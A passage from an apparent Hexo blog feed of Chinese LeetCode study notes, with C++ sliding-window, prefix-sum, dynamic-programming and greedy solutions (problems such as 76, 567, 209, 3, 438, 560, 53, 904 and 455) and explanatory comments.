<pre><code>对于 t 中重复字符，我们寻找的子字符串中该字符数量必须不少于 t 中该字符数量。
如果 s 中存在这样的子串，我们保证它是唯一的答案。
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/94cc3dbdfe7748eeab0d01e4c0c9f2ab.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">minWindow</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; need, window;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c : t) need[c]++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> valid = <span class="number">0</span>;<span class="comment">//记录已正确匹配的 字符个数</span></span><br><span class="line">    <span class="comment">// 记录最小覆盖子串的起始索引及长度</span></span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, len = INT_MAX;</span><br><span class="line">    <span class="keyword">while</span> (right &lt; s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="comment">// c 是将移入窗口的字符</span></span><br><span class="line">        <span class="keyword">char</span> c = s[right];</span><br><span class="line">        <span class="comment">// 右移窗口</span></span><br><span class="line">        right++;</span><br><span class="line">        <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">        <span class="keyword">if</span> (need.<span class="built_in">count</span>(c)) &#123;</span><br><span class="line">            window[c]++;</span><br><span class="line">            <span class="keyword">if</span> (window[c] == need[c])<span class="comment">//保证数量一致</span></span><br><span class="line">                valid++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断左侧窗口是否要收缩</span></span><br><span class="line">        <span class="keyword">while</span> (valid == need.<span class="built_in">size</span>()) &#123;<span class="comment">//注意是while</span></span><br><span class="line">            <span class="comment">// 在这里更新最小覆盖子串</span></span><br><span class="line">            <span class="keyword">if</span> (right-left &lt; len) &#123;</span><br><span class="line">                start = left;</span><br><span class="line">                len = right-left;<span class="comment">//更新长度</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// d 是将移出窗口的字符</span></span><br><span class="line">            <span class="keyword">char</span> d = s[left];</span><br><span class="line">            <span class="comment">// 左移窗口</span></span><br><span class="line">            left++;</span><br><span class="line">            <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">            <span class="keyword">if</span> (need.<span class="built_in">count</span>(d)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (window[d] == need[d])</span><br><span class="line">                    valid--;</span><br><span class="line">                window[d]--;</span><br><span class="line">            &#125;                    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回最小覆盖子串</span></span><br><span class="line">    <span class="keyword">return</span> len == INT_MAX ?</span><br><span class="line">        <span class="string">&quot;&quot;</span> : s.<span class="built_in">substr</span>(start, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="567-字符串的排列"><a href="#567-字符串的排列" class="headerlink" title="567 字符串的排列"></a>567 字符串的排列</h3><p>给你两个字符串 s1 和 s2 ，写一个函数来判断 s2 是否包含 s1 的排列。如果是，返回 true ；否则，返回 false 。<br>换句话说，s1 的排列之一是 s2 的 子串 。<br><strong>注意：得是连续的-子串</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">checkInclusion</span><span class="params">(string s1, string s2)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; need,window;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c:s1)</span><br><span class="line">            need[c]++;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> valid = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(right &lt; s2.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">char</span> c = s2[right];</span><br><span class="line">            right++;<span class="comment">//右移窗口</span></span><br><span class="line">            <span class="keyword">if</span>(need.<span class="built_in">count</span>(c))&#123;</span><br><span class="line">                window[c]++;</span><br><span class="line">                <span class="keyword">if</span>(window[c] == need[c])</span><br><span class="line">                    valid++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//什么时候左移？当窗口</span></span><br><span class="line">            <span class="comment">//if(valid == s1.size())&#123;</span></span><br><span class="line">            <span class="keyword">while</span>(right-left &gt; s1.<span class="built_in">size</span>())&#123;</span><br><span class="line">                <span class="keyword">char</span> d = s2[left];</span><br><span class="line">                left++;<span class="comment">//左移窗口</span></span><br><span class="line">                <span class="keyword">if</span>(need.<span class="built_in">count</span>(d))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(window[d] == need[d])</span><br><span class="line">                        valid--;</span><br><span class="line">                    window[d]--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(valid == need.<span class="built_in">size</span>())</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">也可以</span><br><span class="line">            <span class="keyword">while</span>(valid == need.<span class="built_in">size</span>())&#123;<span class="comment">//注意：是比较need.size()</span></span><br><span class="line">                <span class="keyword">if</span>(right-left == s1.<span class="built_in">size</span>())</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">char</span> d = s2[left];</span><br><span class="line">                left++;<span class="comment">//左移窗口</span></span><br><span class="line">                <span class="keyword">if</span>(need.<span class="built_in">count</span>(d))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(window[d] == need[d])</span><br><span class="line">                        valid--;</span><br><span class="line">                    window[d]--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<h3 id="209-长度最小的子数组——滑动窗口i表示终止位置"><a href="#209-长度最小的子数组——滑动窗口i表示终止位置" class="headerlink" title="209 长度最小的子数组——滑动窗口i表示终止位置"></a>209 长度最小的子数组——滑动窗口i表示终止位置</h3><p>给定一个含有 n 个正整数的数组和一个正整数 target 。<br>找出该数组中满足其和 ≥ target 的【长度最小】的 <strong>连续子数组</strong> [numsl, numsl+1, …, numsr-1, numsr] ，并返回其长度。如果不存在符合条件的子数组，返回 0 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    暴力 O(n^2)     ans = min(ans,j-i+1);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minSubArrayLen</span><span class="params">(<span class="keyword">int</span> target, vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = INT_MAX;<span class="comment">//初始化 无穷大</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;n;j++)&#123;<span class="comment">//j=i;</span></span><br><span class="line">                sum += nums[j];</span><br><span class="line">                <span class="keyword">if</span>(sum&gt;=target)&#123;</span><br><span class="line">                    ans = <span class="built_in">min</span>(ans,j-i+<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans == INT_MAX ? <span class="number">0</span>:ans; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    滑动窗口：如何移动起始位置</span></span><br><span class="line"><span class="comment">    注意：如果i表示的是起始位置的话，其本质上与暴力解法并没有什么不同，依然要遍历i后面的所有元素。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minSubArrayLen</span><span class="params">(<span class="keyword">int</span> target, vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = INT_MAX;<span class="comment">//初始化 无穷大</span></span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;<span class="comment">//起始位置,只有找到一个满足条件的集合之后，再+1移动</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//i 终止位置，不断向前遍历</span></span><br><span class="line">            sum += nums[i];</span><br><span class="line">            <span class="keyword">while</span>(sum&gt;=target)&#123;</span><br><span class="line">                ans = <span class="built_in">min</span>(ans,i-j+<span class="number">1</span>);</span><br><span class="line">                sum -= nums[j];<span class="comment">//注意：i向后移动1的时候，和sum 也需要减去【当前集合 的 起始值nums[j]】</span></span><br><span class="line">                j++;<span class="comment">//重点：滑动！！</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans == INT_MAX ? <span class="number">0</span>:ans; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="3-无重复字符的最长子串——双指针、滑动窗口"><a href="#3-无重复字符的最长子串——双指针、滑动窗口" class="headerlink" title="3 无重复字符的最长子串——双指针、滑动窗口"></a>3 无重复字符的最长子串——双指针、滑动窗口</h3><p>给定一个字符串 s ，请你找出其中【不含有重复字符的最长子串的长度】。<br><img src="https://img-blog.csdnimg.cn/14c8c43b2eb24be293a7bb7c64161825.png"><br>我们使用两个指针表示字符串中的某个子串（或窗口）的左右边界，其中左指针代表着上文中「枚举子串的起始位置」，而右指针即为上文中的 rk​；<br>在枚举结束后，我们找到的最长的子串的长度即为答案。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双指针 unordered_set&lt;char&gt; seen;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        unordered_set&lt;<span class="keyword">char</span>&gt; seen;</span><br><span class="line">        <span class="keyword">int</span> r = <span class="number">-1</span>, res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//依次遍历</span></span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="number">0</span>)</span><br><span class="line">                seen.<span class="built_in">erase</span>(s[i<span class="number">-1</span>]);<span class="comment">//除了第一次之外，之后每次都需要删去前一个元素</span></span><br><span class="line">            <span class="keyword">while</span>(r+<span class="number">1</span>&lt;n &amp;&amp; !seen.<span class="built_in">count</span>(s[r+<span class="number">1</span>]))&#123;<span class="comment">//遍历右指针，不断向右滑，直到找到重复 字符为止</span></span><br><span class="line">                seen.<span class="built_in">insert</span>(s[r+<span class="number">1</span>]);</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            res = <span class="built_in">max</span>(res,r-i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//滑动窗口</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; window;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>; <span class="comment">// 记录结果</span></span><br><span class="line">    <span class="keyword">while</span> (right &lt; s.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">char</span> c = s[right];</span><br><span class="line">        right++;</span><br><span class="line">        <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">        window[c]++;</span><br><span class="line">        <span class="comment">// 判断左侧窗口是否要收缩【当字符重复时】</span></span><br><span class="line">        <span class="keyword">while</span> (window[c] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">char</span> d = s[left];</span><br><span class="line">            left++;</span><br><span class="line">            <span class="comment">// 进行窗口内数据的一系列更新</span></span><br><span class="line">            window[d]--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 更新结果</span></span><br><span class="line">        res = <span class="built_in">max</span>(res, right-left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure>
<h3 id="438-找到字符串中所有字母异位词"><a href="#438-找到字符串中所有字母异位词" class="headerlink" title="438 找到字符串中所有字母异位词"></a>438 找到字符串中所有字母异位词</h3><p>给定两个字符串 s 和 p，找到 s 中所有 p 的 异位词 的子串。<br>【返回这些子串的起始索引】。不考虑答案输出的顺序。<br><strong>异位词</strong>：指由相同字母【重排列】形成的字符串（包括相同的字符串）。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">findAnagrams</span><span class="params">(string s, string p)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; need,window;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c:p)</span><br><span class="line">            need[c]++;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> valid = <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">while</span>(right &lt; s.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">char</span> c = s[right];</span><br><span class="line">            right++;<span class="comment">//右移窗口</span></span><br><span class="line">            <span class="keyword">if</span>(need.<span class="built_in">count</span>(c))&#123;</span><br><span class="line">                window[c]++;</span><br><span class="line">                <span class="keyword">if</span>(window[c] == need[c])</span><br><span class="line">                    valid++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//什么时候左移？当窗口</span></span><br><span class="line">            <span class="comment">//if(valid == p.size())&#123; 书写错误p.size()和need.size()不一定相同的，因为p中可以有重复字符</span></span><br><span class="line">            <span class="keyword">while</span>(valid == need.<span class="built_in">size</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span>(right-left==p.<span class="built_in">size</span>())</span><br><span class="line">                    res.<span class="built_in">push_back</span>(left);<span class="comment">//返回起始索引</span></span><br><span class="line">                <span class="keyword">char</span> d = s[left];</span><br><span class="line">                left++;<span class="comment">//左移窗口</span></span><br><span class="line">                <span class="keyword">if</span>(need.<span class="built_in">count</span>(d))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(window[d] == need[d])</span><br><span class="line">                        valid--;</span><br><span class="line">                    window[d]--;</span><br><span class="line">                &#125;   </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="560-和为-K-的子数组——连续子数组"><a href="#560-和为-K-的子数组——连续子数组" class="headerlink" title="560 和为 K 的子数组——连续子数组"></a>560 和为 K 的子数组——连续子数组</h3><p>给你一个整数数组 nums 和一个整数 k ，请你统计并返回 该数组中和为 k 的【连续子数组】的个数。<br><strong>动规？！</strong><br>pre[i] 为 [0..i] 里所有数的和，则 pre[i] 可以由 pre[i−1] 递推而来，即：<br>    pre[i]=pre[i−1]+nums[i]<br>那么「[j..i] 这个子数组和为 k 」这个条件我们可以转化为<br>    pre[i]−pre[j−1]==k </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">subarraySum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        maap[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>, pre = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> x:nums)&#123;</span><br><span class="line">            pre += x;</span><br><span class="line">            <span class="keyword">if</span>(maap.<span class="built_in">find</span>(pre-k) != maap.<span class="built_in">end</span>())</span><br><span class="line">                count += maap[pre-k];</span><br><span class="line">            maap[pre]++;<span class="comment">//装入 </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  s[i]表示 前i+1个数的和，包括自己</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">subarraySum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">s</span><span class="params">(n)</span></span>;</span><br><span class="line">        s[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            s[i] = s[i<span class="number">-1</span>] + nums[i];<span class="comment">//递推公式</span></span><br><span class="line">            <span class="comment">//maap[s[i]]++;//前和是s[i]的个数——错误！！！！！！！！不应该提前存放</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> count =<span class="number">0</span>;</span><br><span class="line">        maap[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">//这是考虑到 当s[i]==k的情况</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(maap.<span class="built_in">count</span>(s[i]-k))<span class="comment">//maap.count(s[i]-k)考虑到</span></span><br><span class="line">                count += maap[s[i]-k];</span><br><span class="line">            maap[s[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="53-最大子数组和"><a href="#53-最大子数组和" class="headerlink" title="53 最大子数组和"></a>53 最大子数组和</h3><p><strong>分析：</strong><br><strong>第560题：和为 K 的子数组——思路是 求出前i连续序列的和</strong></p>
<p><strong>放在本题上，可以理解为：以第i个数结尾的连续子序列的和</strong></p>
<p><strong>大问题-&gt;小问题：动态规划</strong></p>
<ul>
<li><p>dp[i]：表示以 nums[i] <code>结尾</code> 的 【连续子数组的 <code>最大和</code>】</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> res = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//从1开始</span></span><br><span class="line">            dp[i] = <span class="built_in">max</span>(nums[i],dp[i<span class="number">-1</span>]+nums[i]);</span><br><span class="line">            res = <span class="built_in">max</span>(res,dp[i]);<span class="comment">//更新</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            cout&lt;&lt;dp[i]&lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        cout &lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">或者</span><br><span class="line">        <span class="keyword">if</span>(s[i<span class="number">-1</span>]&gt;=<span class="number">0</span>)</span><br><span class="line">            s[i] = s[i<span class="number">-1</span>] + nums[i];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s[i] = nums[i];</span><br></pre></td></tr></table></figure>
<h3 id="904-水果成篮"><a href="#904-水果成篮" class="headerlink" title="904 水果成篮"></a>904 水果成篮</h3><p>农场从左到右种植了一排果树。这些树用一个整数数组 fruits 表示，其中 fruits[i] 是第 i 棵树上的水果 种类 。</p>
<p>  你只有【两个篮子】，并且每个篮子只能装 单一类型 的水果。每个篮子能够装的水果总量没有限制。<br>  你可以选择任意一棵树开始采摘，你必须从 每棵 树（包括开始采摘的树）上 恰好摘一个水果。采摘的水果应当符合篮子中的水果类型。每采摘一次，你将会向右移动到下一棵树，并继续采摘。<br>  一旦你走到某棵树前，但水果不符合篮子的水果类型，那么就必须停止采摘。</p>
</li>
</ul>
<p>给你一个整数数组 fruits ，返回你可以<strong>收集的水果的 最大 数目</strong>。</p>
<p><strong>分析：</strong><br>【滑动窗口】：left 和 right 分别表示满足要求的窗口的左右边界，同时使用哈希表存储这个窗口内的数以及出现的次数。</p>
<p>我们每次将 right 移动一个位置，并将 fruits[right] 加入哈希表。如果此时哈希表不满足要求（即哈希表中出现超过两个键值对），那么我们需要不断移动 left，并将 fruits[left] 从哈希表中移除，直到哈希表满足要求为止。</p>
<p>注意的是，将 fruits[left] 从哈希表中移除后，如果 fruits[left] 在哈希表中的出现次数减少为 0，需要将对应的键值对从哈希表中移除。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">totalFruit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; fruits)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = fruits.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; maap;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> right=<span class="number">0</span>; right&lt;n; right++)&#123;</span><br><span class="line">            maap[fruits[right]]++;<span class="comment">//装入</span></span><br><span class="line">            <span class="keyword">while</span>(maap.<span class="built_in">size</span>()&gt;<span class="number">2</span>)&#123;<span class="comment">//因为结果只能包含两种树</span></span><br><span class="line">                <span class="keyword">auto</span> it = maap.<span class="built_in">find</span>(fruits[left]);</span><br><span class="line">                --it-&gt;second;</span><br><span class="line">                <span class="keyword">if</span>(it-&gt;second==<span class="number">0</span>)</span><br><span class="line">                    maap.<span class="built_in">erase</span>(it);</span><br><span class="line">                left++;<span class="comment">//滑动左边界</span></span><br><span class="line">            &#125;</span><br><span class="line">            res = <span class="built_in">max</span>(res,right-left+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>十一、贪心</title>
    <url>/2025/12/03/%E5%8D%81%E4%B8%80%E3%80%81%E8%B4%AA%E5%BF%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="十一、贪心"><a href="#十一、贪心" class="headerlink" title="十一、贪心"></a>十一、贪心</h2><p>eg:取钞票<br>【局部最优】-&gt;【全局最优】</p>
<h3 id="455-分发饼干"><a href="#455-分发饼干" class="headerlink" title="455 分发饼干"></a>455 分发饼干</h3><p>假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，【每个孩子最多只能给一块饼干】【注意！！！】。<br>对每个孩子 i，都有一个胃口值 g[i]，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干 j，都有一个尺寸 s[j] 。如果 s[j] &gt;= g[i]，我们可以将这个饼干 j 分配给孩子 i ，这个孩子会得到满足。<br><strong>尽可能满足越多数量的孩子</strong>，并<strong>输出这个最大数值</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    策略：【用大饼干】 尽可能胃 【大胃口的孩子】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findContentChildren</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; child, vector&lt;<span class="keyword">int</span>&gt;&amp; cookie)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n_ch = child.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n_si = cookie.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(child.<span class="built_in">begin</span>(),child.<span class="built_in">end</span>());<span class="comment">//升序排序</span></span><br><span class="line">        <span class="built_in">sort</span>(cookie.<span class="built_in">begin</span>(),cookie.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> index = n_si<span class="number">-1</span>;<span class="comment">//遍历 饼干</span></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//记录结果 ：满足胃口的孩子个数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n_ch<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="comment">//判断当前饼干是否 满足 当前孩子胃口</span></span><br><span class="line">            <span class="keyword">if</span>(index&gt;=<span class="number">0</span> &amp;&amp; cookie[index]&gt;=child[i])&#123;</span><br><span class="line">                res++;<span class="comment">//满足：结果++</span></span><br><span class="line">                index--;</span><br><span class="line">            &#125;       </span><br><span class="line">            <span class="comment">//不满足：去看是否满足下一个孩子i++</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
